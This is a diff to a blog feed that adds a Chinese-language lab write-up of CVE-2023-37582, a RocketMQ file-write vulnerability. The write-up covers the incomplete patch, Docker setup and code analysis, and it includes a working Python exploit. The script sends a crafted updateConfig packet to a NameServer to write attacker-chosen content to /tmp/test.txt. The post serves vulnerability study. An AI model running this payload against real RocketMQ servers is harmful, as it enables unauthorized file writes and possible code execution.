@@ -4,6 +4,27 @@
   
   
   <entry>
+    <title>CVE-2023-37582 Apache RocketMQ 文件写入漏洞</title>
+    <link href="/2023/08/30/CVE-2023-37582-Apache-RocketMQ-%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2023/08/30/CVE-2023-37582-Apache-RocketMQ-%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>根据<a href="https://github.com/y1ong/blog-timeline/issues/34" target="_blank" rel="noopener">漏洞描述</a>，CVE-2023-33246除了上一篇文章的Runtime命令执行外，通过运行时修改配置还有别的利用方法。</p><a id="more"></a><p>对此，官方的修复方式就是对一些配置项如configStorePathName的修改做了权限限制：</p><pre><code class="java">if (properties.containsKey(&quot;kvConfigPath&quot;) || properties.containsKey(&quot;configStorePathName&quot;)) {    response.setCode(ResponseCode.NO_PERMISSION);    response.setRemark(&quot;Can not update config path&quot;);    return response;}</code></pre><p>由于权限限制不到位，导致一些配置项还是可以在运行时被远程修改，从而导致任意文件写入漏洞。</p><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>镜像：</p><pre><code class="shell">docker pull apache/rocketmq:5.1.1</code></pre><p>启动Name Server和Broker：</p><pre><code class="shell">docker run -d --name namesrv -p 9876:9876 apache/rocketmq:5.1.1 sh mqnamesrvdocker run -d -p 10911:10911 -p 10909:10909 -v /home/aluvion/桌面/rocketmq/broker.conf:/opt/rocketmq/conf/broker.conf --name broker --link namesrv:namesrv -e &quot;NAMESRV_ADDR=namesrv:9876&quot; -e &quot;MAX_POSSIBLE_HEAP=200000000&quot; apache/rocketmq:5.1.1 sh mqbroker -c /opt/rocketmq/conf/broker.conf</code></pre><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>根据参考文章，可以通过Python编写脚本连接Name Server服务更新配置完成漏洞利用：</p><pre><code class="python"># -*- coding:utf8 -*-import socketimport binasciiclient = socket.socket()# you ipclient.connect((&#39;192.168.88.129&#39;, 9876))# datajson = &#39;{&quot;code&quot;:318,&quot;flag&quot;:0,&quot;language&quot;:&quot;JAVA&quot;,&quot;opaque&quot;:266,&quot;serializeTypeCurrentRPC&quot;:&quot;JSON&quot;,&quot;version&quot;:433}&#39;.encode(&#39;utf-8&#39;)body = &#39;configStorePath=/tmp/test.txt\nproductEnvName=123\\n&lt;?php echo 233;&gt;&#39;.encode(&#39;utf-8&#39;)json_lens = int(len(binascii.hexlify(json).decode(&#39;utf-8&#39;))/2)head1 = &#39;00000000&#39;+str(hex(json_lens))[2:]all_lens = int(4+len(binascii.hexlify(body).decode(&#39;utf-8&#39;))/2+json_lens)head2 = &#39;00000000&#39;+str(hex(all_lens))[2:]data = head2[-8:]+head1[-8:]+binascii.hexlify(json).decode(&#39;utf-8&#39;)+binascii.hexlify(body).decode(&#39;utf-8&#39;)# sendclient.send(bytes.fromhex(data))data_recv = client.recv(1024)print(data_recv)</code></pre><p>脚本运行后成功写入文件，环境搭建成功。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据<a href="https://github.com/apache/rocketmq/pull/6843/commits/c1fdf1d62c627d6cfbae06d0e15f1c23c7be654b" target="_blank" rel="noopener">修复补丁</a>，修复点位于DefaultRequestProcessor类的updateConfig函数中，该函数负责读取配置项字符串并从中生成Properties类型的配置项：</p><pre><code class="java">this.namesrvController.getConfiguration().update(properties);</code></pre><p>update函数负责根据输入更新配置，在此过程中将输入配置项与自身原有的配置项合并，并写入到配置对象中，再往下到persist函数：</p><pre><code class="java">MixAll.string2File(allConfigs, this.getStorePath());</code></pre><p>到string2File函数，看函数名和参数似乎会将所有配置项写入某个文件中，其中getStorePath函数负责获取写入文件路径： </p><pre><code class="java">if (this.storePathFromConfig) {    try {        realStorePath = (String)this.storePathField.get(this.storePathObject);    } catch (IllegalAccessException var7) {        this.log.error(&quot;getStorePath error, &quot;, var7);    }}</code></pre><p>懒得重启docker远程调试了，根据参考文章，这里的storePathFromConfig成员为true，storePathField为NamesrvConfig类的configStorePath成员，因此文件写入路径可控，而写入内容为配置项，因此内容部分可控，即可以通过远程修改配置的方式触发文件写入漏洞。</p><p>查看写入文件中的所有配置项，可以看到字符串类型的配置项不多，考虑到黑名单的影响和修改目录配置可能导致非预期错误，使用processRequest配置项控制文件内容是比较恰当的做法。</p><p>最后就是根据RocketMQ协议完成流量包的构造，然后发生触发漏洞，懒得调试所以不对根据协议构造流量包这一步多加分析了，开摆。</p><hr><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.freebuf.com/vuls/373512.html" target="_blank" rel="noopener">Apache RocketMQ 远程代码执行漏洞（CVE-2023-37582）</a></p><p><a href="https://www.freebuf.com/vuls/372596.html" target="_blank" rel="noopener">CVE-2023-37582 Apache RocketMQ 更新配置远程代码执行漏洞</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+      <tag>RocketMQ</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>CVE-2023-33246 Apache RocketMQ 远程代码执行漏洞</title>
     <link href="/2023/08/29/CVE-2023-33246-Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
     <url>/2023/08/29/CVE-2023-33246-Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
